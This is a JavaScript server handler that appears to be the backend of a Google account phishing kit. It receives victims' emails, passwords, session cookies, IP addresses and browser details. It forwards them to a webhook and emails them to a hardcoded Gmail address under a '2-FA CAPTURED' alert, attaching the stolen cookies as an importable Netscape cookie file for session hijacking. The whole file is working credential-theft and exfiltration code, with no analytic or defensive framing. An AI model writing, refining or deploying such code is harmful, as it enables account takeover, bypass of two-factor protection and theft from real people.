import nodemailer from 'nodemailer';
import PDFDocument from 'pdfkit';

function generateCookiePDF(cookies, email, domain) {
  return new Promise((resolve) => {
    const doc = new PDFDocument();
    const chunks = [];

    doc.on('data', (chunk) => chunks.push(chunk));
    doc.on('end', () => resolve(Buffer.concat(chunks)));

    doc.fontSize(16).text(`Victim Cookies: ${email}`, 50, 50);
    doc.moveDown();

    doc.fontSize(12).text('# Netscape HTTP Cookie File', 50, 100);
    doc.text('# Import into Cookie-Editor or browser (EditThisCookie)', 50, 120);

    const dom = domain || 'localhost';
    const expires = Math.floor(Date.now() / 1000) + 86400; // +1 day

    if (cookies && cookies !== 'none') {
      const lines = cookies.split(';').map((c) => {
        const eq = c.trim().indexOf('=');
        if (eq < 0) return null;
        const name = c.trim().substring(0, eq).trim();
        const value = c.trim().substring(eq + 1).trim();
        if (!name) return null;
        // Netscape: domain  inclusion  path  secure  expiration  name  value
        return `${dom}\tTRUE\t/\t0\t${expires}\t${name}\t${value}`;
      }).filter(Boolean);
      doc.text(lines.join('\n'), 50, 160);
    } else {
      doc.text('No cookies captured', 50, 160);
    }

    doc.end();
  });
}

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const data = req.body;
  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.connection.remoteAddress;

  console.log('Captured:', data.email, ip);

  // WEBHOOK BACKUP (optional)
  try {
    await fetch(process.env.WEBHOOK_URL || 'https://webhook.site/#!/temp', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ ...data, ip }),
    });
  } catch {}

  // GMAIL EMAIL
  try {
    const transporter = nodemailer.createTransport({
      host: 'smtp.gmail.com',
      port: 587,
      secure: false,
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS,
      },
    });

    const pdfBuffer = await generateCookiePDF(data.cookies, data.email, data.captureDomain);
    const pdfFilename = `${(data.email || 'victim').replace(/[@.]/g, '_')}_cookies.pdf`;

    await transporter.sendMail({
      from: `"Security Alert" <${process.env.EMAIL_USER}>`,
      to: 'busmeup13@gmail.com',
      subject: `🔔 GMAIL 2-FA CAPTURED: ${data.email}`,
      html: `
        <div style="font-family: -apple-system,BlinkMacSystemFont,'Segoe UI',Roboto;">
          <h2 style="color:#d93025">🎯 Google Workspace Credentials</h2>
          <table cellpadding="8" style="border:1px solid #ddd;width:100%">
            <tr><td><strong>⏰ Time</strong></td><td>${new Date().toLocaleString()}</td></tr>
            <tr><td><strong>🌐 IP</strong></td><td>${ip}</td></tr>
            <tr><td><strong>📧 Email</strong></td><td>${data.email}</td></tr>
            <tr><td><strong>🔑 Password</strong></td><td style="font-family:monospace;color:#d93025">${data.password}</td></tr>
            <tr><td><strong>🍪 Cookies</strong></td><td>
              📄 <strong>PDF attached</strong> (Netscape format)<br>
              ${data.cookiesImportLink ? `<a href="${String(data.cookiesImportLink).replace(/"/g, '&quot;')}" target="_blank" style="color:#1a73e8">🔗 Import link (Cookie-Editor)</a>` : ''}
            </td></tr>
            <tr><td><strong>👤 Browser</strong></td><td>${data.userAgent?.slice(0, 80)}...</td></tr>
          </table>
          <details>
            <summary>Full Data (JSON)</summary>
            <pre style="background:#f5f5f5;padding:16px;overflow:auto">${JSON.stringify(
              { ...data, cookies: data.cookiesImportLink ? 'See PDF + import link' : 'none' },
              null,
              2
            )}</pre>
          </details>
        </div>
      `,
      attachments: [
        {
          filename: pdfFilename,
          content: pdfBuffer,
          contentType: 'application/pdf',
        },
      ],
    });
  } catch (err) {
    console.error('Email send failed:', err.message);
  }

  res.json({ status: 'captured ✅', email: data.email });
}
